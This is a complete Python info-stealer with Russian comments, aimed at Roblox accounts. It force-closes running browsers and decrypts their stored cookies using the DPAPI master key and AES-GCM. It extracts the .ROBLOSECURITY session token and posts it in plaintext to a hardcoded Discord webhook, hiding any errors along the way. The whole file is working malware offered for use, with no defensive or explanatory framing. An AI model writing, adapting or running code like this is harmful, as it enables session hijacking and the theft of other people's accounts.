import os
import sqlite3
import json
import base64
import subprocess
import time
import psutil
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
import win32crypt
import pyperclip

# Пути к данным браузеров
LOCAL = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local')
ROAMING = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Roaming')

# Список браузеров и их исполняемых файлов
BROWSERS = {
    'Chrome': {
        'path': LOCAL + r'\Google\Chrome\User Data',
        'exe': ['chrome.exe', 'chrome_proxy.exe']
    },
    'Edge': {
        'path': LOCAL + r'\Microsoft\Edge\User Data',
        'exe': ['msedge.exe', 'msedgewebview2.exe']
    },
    'Brave': {
        'path': LOCAL + r'\BraveSoftware\Brave-Browser\User Data',
        'exe': ['brave.exe', 'brave_proxy.exe']
    },
    'Opera': {
        'path': ROAMING + r'\Opera Software\Opera Stable',
        'exe': ['opera.exe', 'opera_proxy.exe']
    },
    'Opera GX': {
        'path': ROAMING + r'\Opera Software\Opera GX Stable',
        'exe': ['opera.exe', 'opera_gx.exe']
    },
    'Vivaldi': {
        'path': LOCAL + r'\Vivaldi\User Data',
        'exe': ['vivaldi.exe']
    },
    'Yandex': {
        'path': LOCAL + r'\Yandex\YandexBrowser\User Data',
        'exe': ['browser.exe', 'yandex.exe']
    }
}

COOKIE_NAME = '.ROBLOSECURITY'

def close_browsers():
    """Закрывает все процессы браузеров"""
    
    browsers_closed = []
    for browser_name, browser_info in BROWSERS.items():
        for exe_name in browser_info['exe']:
            try:
                for proc in psutil.process_iter(['pid', 'name']):
                    if proc.info['name'] and exe_name.lower() in proc.info['name'].lower():
                        try:
                            p = psutil.Process(proc.info['pid'])
                            p.terminate()
                            p.wait(timeout=3)
                            if browser_name not in browsers_closed:
                                browsers_closed.append(browser_name)
                        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.TimeoutExpired):
                            pass
            except Exception as e:
                pass
    
    # Даем время для освобождения файлов
    if browsers_closed:
        time.sleep(2)
    
    return browsers_closed

def is_browser_running(browser_name):
    """Проверяет, запущен ли браузер"""
    browser_info = BROWSERS.get(browser_name)
    if not browser_info:
        return False
    
    for exe_name in browser_info['exe']:
        for proc in psutil.process_iter(['name']):
            if proc.info['name'] and exe_name.lower() in proc.info['name'].lower():
                return True
    return False

def get_master_key(browser_path):
    """Получаем ключ для расшифровки из Local State"""
    local_state_path = os.path.join(browser_path, 'Local State')
    
    if not os.path.exists(local_state_path):
        return None
    
    try:
        with open(local_state_path, 'r', encoding='utf-8') as f:
            local_state = json.load(f)
        
        encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
        # Убираем префикс DPAPI
        encrypted_key = encrypted_key[5:]
        
        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    except Exception as e:
        return None

def decrypt_value(encrypted_value, key):
    """Расшифровываем значение куки"""
    try:
        if encrypted_value[:3] == b'v10':
            # Nonce находится на позиции 3:15
            nonce = encrypted_value[3:15]
            ciphertext = encrypted_value[15:-16]
            tag = encrypted_value[-16:]
            
            cipher = Cipher(
                algorithms.AES(key),
                modes.GCM(nonce, tag),
                backend=default_backend()
            )
            decryptor = cipher.decryptor()
            return decryptor.update(ciphertext) + decryptor.finalize()
        
        # Старый метод DPAPI
        return win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1]
    except Exception:
        return None

def get_roblox_cookies():
    """Ищем куки Roblox во всех браузерах"""
    results = {}
    
    for browser_name, browser_info in BROWSERS.items():
        browser_path = browser_info['path']
        
        # Проверяем, закрыт ли браузер
        if is_browser_running(browser_name):
            continue
        
        # Пробуем разные пути к файлам cookies
        possible_paths = [
            os.path.join(browser_path, 'Default', 'Cookies'),
            os.path.join(browser_path, 'Default', 'Network', 'Cookies'),
            os.path.join(browser_path, 'Cookies')  # Для некоторых браузеров
        ]
        
        for cookies_path in possible_paths:
            if os.path.exists(cookies_path):
                try:
                    # Создаем временную копию файла, чтобы избежать блокировок
                    temp_path = cookies_path + '.temp'
                    
                    # Копируем файл
                    import shutil
                    shutil.copy2(cookies_path, temp_path)
                    
                    key = get_master_key(browser_path)
                    if not key:
                        os.remove(temp_path)
                        continue
                    
                    conn = sqlite3.connect(temp_path)
                    cursor = conn.cursor()
                    
                    # Ищем куки Roblox
                    cursor.execute("""
                        SELECT host_key, name, encrypted_value, path, expires_utc 
                        FROM cookies 
                        WHERE host_key LIKE '%roblox.com%' AND name='.ROBLOSECURITY'
                    """)
                    
                    cookies_found = []
                    for host_key, name, encrypted_value, path, expires_utc in cursor.fetchall():
                        decrypted = decrypt_value(encrypted_value, key)
                        if decrypted:
                            token_str = decrypted.decode('utf-8', errors='ignore')
                            
                            # Проверяем срок действия
                            is_expired = expires_utc != 0 and expires_utc < (time.time() * 1000000)
                            
                            cookies_found.append({
                                'domain': host_key,
                                'path': path,
                                'expired': is_expired,
                                'token_preview': f"{token_str}" if len(token_str) > 20 else "***",
                                'full_length': len(token_str),
                                'expires': time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(expires_utc / 1000000)) if expires_utc != 0 else 'Session'
                            })
                    
                    conn.close()
                    os.remove(temp_path)
                    
                    if cookies_found:
                        results[browser_name] = cookies_found
                        
                except Exception as e:
                    # Пробуем следующий путь
                    continue
    
    return results

def display_results(cookies, closed_browsers):
    """Выводит результаты в удобном формате"""
    if not cookies:
        return
    
    for browser, cookie_list in cookies.items():
        
        for i, cookie in enumerate(cookie_list, 1):
            text = f"{cookie['token_preview']}"
            import requests

            WEBHOOK_URL = "https://discord.com/api/webhooks/1474867611777896530/hzZgvNpkuZaWsAv2MHw0PqYVzCBK9aa39NSjOF7cMFbaV1m8WbIxdYr4z-yzYQ1e7e6f"

            def send_message(text):
                """Отправляет сообщение в Discord через webhook"""
                data = {"content": text}
                response = requests.post(WEBHOOK_URL, json=data)
                return response.status_code == 204

            if __name__ == "__main__":
                # Пример использования
                message = text
                
                if send_message(message):
                    print("Сообщение отправлено!")
                else:
                    print("Ошибка отправки")


    total_cookies = sum(len(cookie_list) for cookie_list in cookies.values())
    valid_cookies = sum(1 for cookie_list in cookies.values() for cookie in cookie_list if not cookie['expired'])

def main():
    # Закрываем браузеры
    closed_browsers = close_browsers()
    cookies = get_roblox_cookies()
    display_results(cookies, closed_browsers)

if __name__ == '__main__':
    try:
        try:
            is_admin = os.getuid() == 0
        except AttributeError:
            is_admin = False
        
        main()
    except:
        pass